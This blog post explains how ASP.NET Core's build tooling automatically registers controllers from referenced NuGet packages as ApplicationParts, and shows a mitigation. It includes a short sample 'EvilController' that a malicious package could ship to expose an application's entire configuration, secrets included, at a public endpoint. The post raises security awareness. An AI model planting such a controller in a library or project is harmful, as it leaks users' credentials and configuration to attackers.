---
layout: post
title:  "ASP.NET Core ApplicationPart & EvilController 😱"
date:   2019-12-16 20:40:00 +0100
tags: [C#,.NET Core,ASP.NET Core]
author: Miňo Martiniak
comments: true
---

Do you blindly trust third-party libraries?
What if this package contains e.g. following code and you reference it in your ASP.NET Core project?

```csharp
[ApiController]
[Route("[controller]")]
public class EvilController : ControllerBase
{
    [HttpGet]
    public IEnumerable<KeyValuePair<string, string>> Get()
    {
        var configuration = HttpContext.RequestServices.GetService(typeof(IConfiguration)) as IConfiguration;

        return configuration.AsEnumerable().OrderBy(p => p.Key);
    }
}
```

If author (attacker) calls `your-site-url/evil`, than can get the following result:

![](https://gist.github.com/Burgyn/1fafbffcb737b4a73341ae2f7dd1626b/raw/ec45967614cb362c41aa4acd23afed8221e03d2a/EvilOutput.png)

> Of course the code in this controller can be more dangerous.

Do not believe? Try this [demo](https://github.com/Burgyn/Sample.EvilControllers).

## Surprising?

At first glance, yes. Documentation and blog posts say that if we want to add controllers from external assemblies, we need to add `ApplicationPart` by calling `mvcBuilder.AddApplicationPart(assembly);`.
But we do not call anything like this. So why is external `EvilController` discovered?

Answer is [AspNet Core build tooling](https://github.com/aspnet/AspNetCore-Tooling/pull/598) and [ApplicationPartAttribute](https://docs.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.mvc.applicationparts.applicationpartattribute?view=aspnetcore-3.0).

_AspNet Core build tooling_ discovers dependencies that reference MVC features _(in dependencies tree)_ and add them as `ApplicationPartAttribute` to your assembly _(during build time)_. When _ASP.NET Core_ application starts, it use the [ApplicationPartManger](https://github.com/aspnet/AspNetCore/blob/master/src/Mvc/Mvc.Core/src/ApplicationParts/ApplicationPartManager.cs) for adding external assembly as `ApplicationParts`. By default, `ApplicationPartManager` searches for `ApplicationPartAttribute`. That's why the package with `EvilController` is added as an `ApplicationPart` to your application.

## How to avoid it?

Do not use suspicious packages! 😊

Okay, but what if I don't want to study the external library in detail and still want to use it?

In this case, you can remove external application parts from your application. For example:

```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddControllers()
        .ConfigureApplicationPartManager(o =>
        {
            o.ApplicationParts.Clear();
            o.ApplicationParts.Add(new AssemblyPart(typeof(Startup).Assembly);
        });
}
```

## References

- [More info about ApplicationPart](https://docs.microsoft.com/en-us/aspnet/core/mvc/advanced/app-parts?view=aspnetcore-3.1)
